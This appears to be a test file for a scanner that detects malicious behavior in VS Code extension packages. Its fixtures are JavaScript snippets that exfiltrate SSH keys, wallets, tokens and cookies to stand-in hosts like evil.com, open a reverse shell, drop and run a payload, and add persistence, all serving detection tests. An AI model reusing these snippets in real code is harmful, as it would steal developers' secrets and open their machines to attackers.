import { describe, expect, it } from "vitest";
import type { VsixContents, VsixManifest } from "../types.js";
import { checkChains } from "./chains.js";

function makeContents(files: Record<string, string>): VsixContents {
  const manifest: VsixManifest = {
    name: "test-extension",
    publisher: "test",
    version: "1.0.0",
  };

  const fileMap = new Map<string, Buffer>();
  for (const [name, content] of Object.entries(files)) {
    fileMap.set(name, Buffer.from(content));
  }

  return { manifest, files: fileMap, basePath: "/test" };
}

describe("checkChains", () => {
  describe("DataFlow patterns (source → sink)", () => {
    it("detects SSH key exfiltration", () => {
      const code = `
        const fs = require('fs');
        const key = fs.readFileSync('.ssh/id_rsa');
        axios.post('https://evil.com/steal', { data: key });
      `;
      const findings = checkChains(makeContents({ "extension/src/evil.js": code }));

      expect(findings.length).toBeGreaterThan(0);
      const sshExfil = findings.find((f) => f.id === "FLOW_SSH_KEY_EXFIL");
      expect(sshExfil).toBeDefined();
      expect(sshExfil?.severity).toBe("critical");
      expect(sshExfil?.category).toBe("dataflow");
    });

    it("detects wallet exfiltration", () => {
      const code = `
        const wallet = await fs.readFile('.ethereum/keystore/account');
        await fetch('https://evil.com/api', { method: 'POST', body: wallet });
      `;
      const findings = checkChains(makeContents({ "extension/src/steal.js": code }));

      const walletExfil = findings.find((f) => f.id === "FLOW_WALLET_EXFIL");
      expect(walletExfil).toBeDefined();
      expect(walletExfil?.severity).toBe("critical");
    });

    it("detects credential file exfiltration", () => {
      const code = `
        const envData = fs.readFileSync('.env.production');
        request.post('https://collector.io/data', { body: envData });
      `;
      const findings = checkChains(makeContents({ "extension/src/leak.js": code }));

      const credExfil = findings.find((f) => f.id === "FLOW_CRED_EXFIL");
      expect(credExfil).toBeDefined();
    });

    it("detects browser data theft", () => {
      const code = `
        const cookies = fs.readFileSync('Google/Chrome/Cookies');
        got.post('https://stealer.net', { json: cookies });
      `;
      const findings = checkChains(makeContents({ "extension/src/browser.js": code }));

      const browserExfil = findings.find((f) => f.id === "FLOW_BROWSER_EXFIL");
      expect(browserExfil).toBeDefined();
    });

    it("detects Discord webhook exfiltration", () => {
      const code = `
        const sshKey = fs.readFileSync('.ssh/id_ed25519');
        fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body: sshKey });
      `;
      const findings = checkChains(makeContents({ "extension/src/discord.js": code }));

      const discordExfil = findings.find((f) => f.id === "FLOW_SSH_DISCORD");
      expect(discordExfil).toBeDefined();
    });

    it("detects API token theft", () => {
      const code = `
        const token = process.env.GITHUB_TOKEN;
        axios.post('https://collector.io/tokens', { token });
      `;
      const findings = checkChains(makeContents({ "extension/src/tokens.js": code }));

      const tokenExfil = findings.find((f) => f.id === "FLOW_TOKEN_EXFIL");
      expect(tokenExfil).toBeDefined();
    });

    it("does not trigger when source and sink are too far apart", () => {
      const code = `
        const key = fs.readFileSync('.ssh/id_rsa');
        ${"// padding\n".repeat(200)}
        axios.post('https://example.com', { data: key });
      `;
      const findings = checkChains(makeContents({ "extension/src/far.js": code }));

      const sshExfil = findings.find((f) => f.id === "FLOW_SSH_KEY_EXFIL");
      expect(sshExfil).toBeUndefined();
    });
  });

  describe("Behavioral patterns (N-stage chains)", () => {
    it("detects credential exfiltration chain", () => {
      const code = `
        const data = fs.readFileSync('/home/user/.env');
        const encoded = Buffer.from(data).toString('base64');
        await fetch('https://evil.com', { method: 'POST', body: encoded });
      `;
      const findings = checkChains(makeContents({ "extension/src/chain.js": code }));

      const credExfil = findings.find((f) => f.id === "BEHAVIOR_CREDENTIAL_EXFIL");
      expect(credExfil).toBeDefined();
      expect(credExfil?.severity).toBe("critical");
      expect(credExfil?.category).toBe("behavioral");
      expect((credExfil?.metadata as { stagesMatched: number })?.stagesMatched).toBe(3);
    });

    it("detects reverse shell pattern", () => {
      const code = `
        const socket = net.connect(4444, 'attacker.com');
        const shell = child_process.spawn('/bin/sh');
        socket.pipe(shell.stdin);
      `;
      const findings = checkChains(makeContents({ "extension/src/shell.js": code }));

      const reverseShell = findings.find((f) => f.id === "BEHAVIOR_REVERSE_SHELL");
      expect(reverseShell).toBeDefined();
      expect(reverseShell?.severity).toBe("critical");
    });

    it("detects dropper pattern", () => {
      const code = `
        const payload = await fetch('https://evil.com/malware.bin');
        fs.writeFileSync('/tmp/.hidden', await payload.buffer());
        child_process.exec('/tmp/.hidden');
      `;
      const findings = checkChains(makeContents({ "extension/src/dropper.js": code }));

      const dropper = findings.find((f) => f.id === "BEHAVIOR_DROPPER");
      expect(dropper).toBeDefined();
      expect(dropper?.severity).toBe("critical");
    });

    it("detects supply chain attack pattern", () => {
      const code = `
        const home = os.homedir();
        const result = execSync('whoami && uname -a');
        await fetch('https://c2.evil.com/collect', { method: 'POST', body: result });
      `;
      const findings = checkChains(makeContents({ "extension/src/supply.js": code }));

      const supplyChain = findings.find((f) => f.id === "BEHAVIOR_SUPPLY_CHAIN_ATTACK");
      expect(supplyChain).toBeDefined();
      expect(supplyChain?.severity).toBe("high");
    });

    it("detects self-propagation (worm) pattern", () => {
      const code = `
        const token = fs.readFileSync('.npmrc');
        const npmToken = process.env.NPM_TOKEN;
        execSync('npm publish --access public');
      `;
      const findings = checkChains(makeContents({ "extension/src/worm.js": code }));

      const propagation = findings.find((f) => f.id === "BEHAVIOR_SELF_PROPAGATION");
      expect(propagation).toBeDefined();
      expect(propagation?.severity).toBe("critical");
    });

    it("detects persistence mechanism", () => {
      const code = `
        const bashrc = path.join(os.homedir(), '.bashrc');
        fs.appendFile(bashrc, '\\nexport PATH=$PATH:/tmp/.malware');
      `;
      const findings = checkChains(makeContents({ "extension/src/persist.js": code }));

      const persistence = findings.find((f) => f.id === "BEHAVIOR_PERSISTENCE");
      expect(persistence).toBeDefined();
    });

    it("does not trigger supply chain when stages are too sparse", () => {
      // maxSpan is 1000 for supply chain, and requires all 3 stages
      const code = `
        const home = os.homedir();
        ${"// lots of padding\n".repeat(100)}
        execSync('build command');
        ${"// more padding\n".repeat(100)}
        fetch('https://telemetry.com');
      `;
      const findings = checkChains(makeContents({ "extension/src/sparse.js": code }));

      const supplyChain = findings.find((f) => f.id === "BEHAVIOR_SUPPLY_CHAIN_ATTACK");
      expect(supplyChain).toBeUndefined();
    });
  });

  describe("Finding metadata", () => {
    it("includes stage details in metadata", () => {
      const code = `
        const data = fs.readFileSync('/secrets');
        const b64 = btoa(data);
        axios.post('https://evil.com', b64);
      `;
      const findings = checkChains(makeContents({ "extension/src/meta.js": code }));

      const finding = findings.find((f) => f.id === "BEHAVIOR_CREDENTIAL_EXFIL");
      expect(finding).toBeDefined();

      const metadata = finding?.metadata as {
        stagesMatched: number;
        totalStages: number;
        stages: Array<{ id: string; name: string; matched: string; line: number }>;
      };

      expect(metadata.stagesMatched).toBe(3);
      expect(metadata.totalStages).toBe(3);
      expect(metadata.stages).toHaveLength(3);
      expect(metadata.stages[0]?.id).toBe("FILE_READ");
      expect(metadata.stages[0]?.matched).toContain("readFileSync");
    });

    it("includes legitimate uses when specified", () => {
      const code = `
        const token = process.env.GITHUB_TOKEN;
        axios.post('https://api.github.com', { headers: { auth: token } });
      `;
      const findings = checkChains(makeContents({ "extension/src/auth.js": code }));

      const finding = findings.find((f) => f.id === "FLOW_TOKEN_EXFIL");
      expect(finding).toBeDefined();

      const metadata = finding?.metadata as { legitimateUses?: string[] };
      expect(metadata.legitimateUses).toBeDefined();
      expect(metadata.legitimateUses).toContain("Token validation services");
    });

    it("includes red flags when specified", () => {
      const code = `
        const key = fs.readFileSync('.ssh/id_rsa');
        fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body: key });
      `;
      const findings = checkChains(makeContents({ "extension/src/flags.js": code }));

      const finding = findings.find((f) => f.id === "FLOW_SSH_KEY_EXFIL");
      expect(finding).toBeDefined();

      const metadata = finding?.metadata as { redFlags?: string[] };
      expect(metadata.redFlags).toBeDefined();
      expect(metadata.redFlags).toContain("Reads .ssh directory");
    });
  });

  describe("Edge cases", () => {
    it("ignores non-scannable files", () => {
      const findings = checkChains(
        makeContents({
          "extension/assets/image.png": "fake png data with .ssh/id_rsa and axios.post",
          "extension/data.json": '{"ssh": ".ssh/id_rsa", "send": "axios.post"}',
        }),
      );

      expect(findings).toHaveLength(0);
    });

    it("deduplicates findings per file", () => {
      const code = `
        const key1 = fs.readFileSync('.ssh/id_rsa');
        const key2 = fs.readFileSync('.ssh/id_ed25519');
        axios.post('https://evil1.com', key1);
        axios.post('https://evil2.com', key2);
      `;
      const findings = checkChains(makeContents({ "extension/src/multi.js": code }));

      const sshFindings = findings.filter((f) => f.id === "FLOW_SSH_KEY_EXFIL");
      expect(sshFindings).toHaveLength(1);
    });

    it("reports separate findings for different files", () => {
      const code = `
        const key = fs.readFileSync('.ssh/id_rsa');
        axios.post('https://evil.com', key);
      `;
      const findings = checkChains(
        makeContents({
          "extension/src/file1.js": code,
          "extension/src/file2.js": code,
        }),
      );

      const sshFindings = findings.filter((f) => f.id === "FLOW_SSH_KEY_EXFIL");
      expect(sshFindings).toHaveLength(2);
    });

    it("handles empty files gracefully", () => {
      const findings = checkChains(
        makeContents({
          "extension/src/empty.js": "",
          "extension/src/whitespace.js": "   \n\n   ",
        }),
      );

      expect(findings).toHaveLength(0);
    });
  });
});
